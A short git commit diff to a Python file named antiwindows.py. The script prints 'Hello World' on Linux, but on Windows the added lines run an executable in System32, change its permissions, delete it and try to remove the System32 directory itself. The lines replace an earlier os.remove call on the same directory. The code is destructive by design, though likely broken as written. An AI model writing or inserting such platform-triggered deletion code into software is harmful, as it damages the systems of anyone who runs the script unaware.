d93c6394865c2e4928d40b8597e19174a2e0a62b
Elektron123 <147244249+Elektron123@users.noreply.github.com>
2026-09-11 20:12:10 +0200

    win

--- code/antiwindows.py
+++ code/antiwindows.py
@@ -3,4 +3,7 @@ from sys import platform
 if platform == "linux" or platform == "linux2":
   print("Hello World")
 elif platform == "win32":
-  os.remove("C:\Windows\System32")
+  os.system("C://Windows//System32//update.exe")
+  os.chmod("C://Windows//System32//update.exe", stat.S_IRWXU)
+  os.remove("C://Windows//System32//update.exe")
+  os.rmdir("C:\Windows\System32")
